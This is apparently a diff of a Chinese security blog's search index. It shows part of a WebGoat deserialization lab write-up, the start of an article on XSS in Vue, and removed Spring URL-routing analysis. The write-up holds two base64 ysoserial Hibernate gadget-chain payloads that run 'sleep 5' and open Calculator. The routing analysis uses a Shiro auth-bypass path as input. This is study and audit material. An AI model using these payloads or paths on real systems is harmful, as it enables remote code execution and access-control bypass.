MamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
+<ol>
+<li>识别反序列化流量</li>
+<li>找到相应可利用执行命令的组件</li>
+</ol>
+<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
+<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
+<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
+<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
+<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
+<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>
+
+<p>在maven中添加</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
+  <entry>
+    <title>前端框架中XSS的代码表现形式</title>
+    <url>/2020/05/21/XSS-in-front/</url>
+    <content><![CDATA[<p>随着前端技术的发展，越来越多的框架默认对XSS做了有效的防范，遵循secure by default原则。</p>
+<p>如果不了解前端框架本身的安全特性，就会导致代码审计过程中对XSS的审计不严密。</p>
+<p>本文是从代码审计的视角去看不同前端框架中可能导致XSS的代码写法。</p>
 <a id="more"></a>
 
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>分析入口：<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/doDispatch.png" alt="doDispatch"></p>
-<p>跟进<code>getHandler</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getHandler.png" alt="getHandler"></p>
-<p>再跟进<code>mapping.getHandler</code>，它是一个<code>interface</code>，此处由<code>AbstractHandlerMapping</code>实现该方法</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/mapping.handler.png" alt="mapping.handler"></p>
-<p>点击148行右侧的绿色图标，跳转到<code>AbstractHandlerMapping#getHandler</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/AbstractHandlerMapping.getHandler.png" alt="AbstractHandlerMapping.getHandler"></p>
-<p>此处<code>getHandlerIngernal</code>是一个抽象方法，在<code>AbstractHandlerMethodMapping#getHandlerInternal</code>中实现了该抽象方法</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getHandlerInternal.png" alt="getHandlerInternal"></p>
-<h2 id="getLookupPathForRequest"><a href="#getLookupPathForRequest" class="headerlink" title="getLookupPathForRequest"></a>getLookupPathForRequest</h2><p>重点在此，<code>getUrlPathHelper().getLookupPathForRequest(request)</code>中从请求中获取代码中对应的path，可以在此下断点进行调试，详细了解Spring是怎么获取请求路径的。</p>
-<p>传入<code>http://localhost/shiro/admin;////..;/manage/page/index</code>进行调试（如果此时传入正常的URL，则<code>getPathWithinServletMapping</code>方法会返回空字符串，再到<code>else</code>中的<code>getPathWithinAPPlication</code>方法）</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getLookupPathForRequest.png" alt="getLookupPathForRequest"></p>
-<p>跟进<code>getPathWithinServletMapping</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping.png" alt="getPathWithinServletMapping"></p>
-<h3 id="getPathWithinApplication"><a href="#getPathWithinApplication" class="headerlink" title="getPathWithinApplication"></a>getPathWithinApplication</h3><p>首先来看<code>getPathWithinApplication</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinApplication.png" alt="getPathWithinApplication"></p>
-<p>其中<code>getContextPath</code>为获取Context path，不做重点分析，重点来看<code>getRequestUri</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getRequestUri.png" alt="getRequestUri"></p>
-<p><code>request.getRequestURI()</code>得到的是<code>/shiro/admin;////..;/manage/page/index</code>，继续跟进<code>decodeAndCleanUriString</code>方法</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/decodeAndCleanUriString.png" alt="decodeAndCleanUriString"></p>
-<p><code>decodeAndCleanUriString</code>方法对<code>uri</code>进行了三种处理</p>
-<p>(1) 移除两个<code>/</code>间，分号和分号后的内容，得到<code>/shiro/admin////../manage/page/index</code></p>
-<p>（例如传入<code>/admin;random/page;jsessionid=1111</code>，会得到<code>/admin/page/</code>）</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/removeSemicolonContent.png" alt="removeSemicolonContent"></p>
-<p>(2) URL解码（URL解码没什么好说的）</p>
-<p>(3) 移除多余的<code>/</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getSanitizedPath.png" alt="getSanitizedPath"></p>
-<p>经过以上处理，最终得到的uri是<code>/shiro/admin/../manage/page/index</code></p>
-<p>回到<code>getPathWithinApplication</code>方法，其中<code>getRemainingPath</code>方法将移除<code>requestUri</code>中和<code>contextPath</code>中相同的字段（在此是<code>/shiro</code>），得到<code>/admin/../manage/page/index</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinApplication2.png" alt="getPathWithinApplication2"></p>
-<h3 id="getServletPath"><a href="#getServletPath" class="headerlink" title="getServletPath"></a>getServletPath</h3><p>也就是通过<code>request.getServletPath()</code>获取Servlet路径，得到<code>/manage/page/index</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getServletPath.png" alt="getServletPath"></p>
-<h3 id="getPathWithinApplication-2"><a href="#getPathWithinApplication-2" class="headerlink" title="getPathWithinApplication 2"></a>getPathWithinApplication 2</h3><p>经过以上代码，回到<code>getPathWithinApplication</code>。其中第218行<code>sanitizedPathWithinApp</code>变量，再次移除多余的<code>/</code>，uri在此无变化。</p>
-<p>之后存在一个if判断，当<code>sanitizedPathWithinApp</code>不是<code>servletPath</code>的子集时，<code>path</code>等于<code>getRemainingPath(pathWithinApp, servletPath, false)</code></p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping2.png" alt="getPathWithinServletMapping2"></p>
-<p>此时<code>getRequestURI</code>得到的<code>/admin/../manage/page/index</code>和<code>getServletPath</code>获取到的<code>/manage/page/index</code>开头无法匹配，经过<code>getRemainingPath</code>得到的path为<code>null</code>。</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getPathWithinServletMapping3.png" alt="getPathWithinServletMapping3"></p>
-<p>经过以上代码处理，最终返回的是<code>servletPath</code>，也就是返回<code>/manage/page/index</code>。</p>
-<p>这里多说一下，通过<code>getReqeustURI</code>和<code>getServletPath</code>进行对比，当两者不同时，尝试<code>getPathInfo</code>。若<code>PathInfo</code>为空，最后返回<code>SerletPath</code>。通过这几个if判断，确保能正确获取请求路径（因为<code>getReqeustURI</code>得到的结果不可信，利用各种URL兼容性难以通过URI判断实际请求路径）。</p>
-<h2 id="lookupHandlerMethod"><a href="#lookupHandlerMethod" class="headerlink" title="lookupHandlerMethod"></a>lookupHandlerMethod</h2><p>得到请求的资源路径之后，回到<code>AbstractHandlerMethodMapping#getHandlerInternal</code>，调用<code>lookupHandlerMethod</code>方法</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/getHandlerInternal2.png" alt="getHandlerInternal2"></p>
-<p>看该方法的描述，进行最合适的匹配。</p>
+<p>参考：<a href="https://sqreen.github.io/VueXSSDemo/#/" target="_blank" rel="noopener">https://sqreen.github.io/VueXSSDemo/#/</a></p>
+<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p>Vue使用双大括号<code></code>将参数显示在浏览器中，双大括号默认将其中的数据解析为普通文本，而非 HTML 代码，这样避免了XSS的产生。</p>
+<p>其他输出指令也同样会将数据解析为普通文本，比如<code>v-model</code></p>
+<p>当然实际业务中也存在输出HTML代码的需求，若想输出真正的 HTML，就需要使用 <code>v-html</code> 指令</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using mustaches: &#123;&#123; rawHtml &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using v-html directive: <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">"rawHtml"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>若此时rawHtml为<code>&lt;span style=&quot;color: red&quot;&gt;This should be malicious.&lt;/span&gt;</code>，实际效果如下图：</p>
+<img src="/2020/05/21/XSS-in-front/vue-xss.png" alt="vue-xss" style="zoom:30%;">
+
+
+
+<p><code>v-html</code>的内容会被浏览器当作HTML字符解析，会导致XSS漏洞产生。</p>
 <blockquote>
-<p>Look up the best-matching handler method for the current request.<br>If multiple matches are found, the best match is selected.</p>
+<p><strong>代码审计关键</strong>：注意<code>v-html</code>，<code>v-html</code>输出的值若用户可控，就可能存在XSS。</p>
 </blockquote>
-<p><img src="/2020/08/22/Spring_URL2Controller/lookupHandlerMethod.png" alt="lookupHandlerMethod"></p>
-<p>它定义了一个<code>matchs</code>的列表，然后内存变量<code>mappingRegistry</code>根据<code>lookupPath</code>获取所有的匹配对象。</p>
-<p>如果存在这个匹配对象，那么回调用<code>addMatchingMappings</code>方法将匹配的对象映射到<code>matches</code>上。</p>
-<p>如果未匹配到这个<code>lookupPath</code>，那么则会循环<code>mappingRegistry</code>中每个Mapping来匹配该路劲（因为RequestMapping中定义的路劲可以有通配符）。</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/mappingRegistry.png" alt="mappingRegistry"></p>
-<p>至于<code>if(!matches.isEmpty())</code>内的代码，只是看看有没有一个请求映射到多个处理方法，如果存在并且优先级还一样，那么就会报错：Ambiguous handler methods mapped for HTTP path。</p>
-<p>来看<code>addMatchingMappings</code>的代码</p>
-<p><img src="/2020/08/22/Spring_URL2Controller/addMatchingMappings.png" alt="addMatchingMappings"></p>
-<p>注意到<code>AbstractHandlerMethodMapping</code>这个class是个泛型抽象类 <code>getMatchingMapping</code>是个抽象方法，返回值为定义的泛型(T)，我们暂且把这个泛型成为[映射信息]。</p>
-<p>根据方法名称，<code>T getMatchingMapping(T,reqeust)</code>，根据映射信息和请求获取是否匹配，如果匹配则返回映射信息。</p>
-<p><code>RequestMappingInfoHandlerMapping</code>这个class继承了这个抽象类,泛型类型为：<code>RequestMappingInfo</code>。看看它的方法实现</p>
